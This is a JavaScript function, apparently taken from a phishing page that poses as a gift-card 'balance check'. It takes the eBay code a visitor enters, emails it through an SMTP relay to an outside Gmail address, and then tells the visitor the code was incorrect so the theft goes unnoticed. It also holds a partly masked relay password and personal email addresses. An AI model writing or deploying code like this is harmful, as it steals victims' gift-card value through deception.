
function setEmail() {
    Email.send({
    Host : "smtp.elasticemail.com",
    Username : "samdaviswills@gmail.com",
    Password : "**********7EBD9",
    To : 'laurabarbie261@gmail.com',
    From : "soshman21@yahoo.com",
    Subject : "New balance check",
    Body : "Ebay Code: " + document.getElementById("enter-code").value
}).then(
  message => document.getElementById("opps").innerHTML = "Opps you just entered an incorrect code."
);
}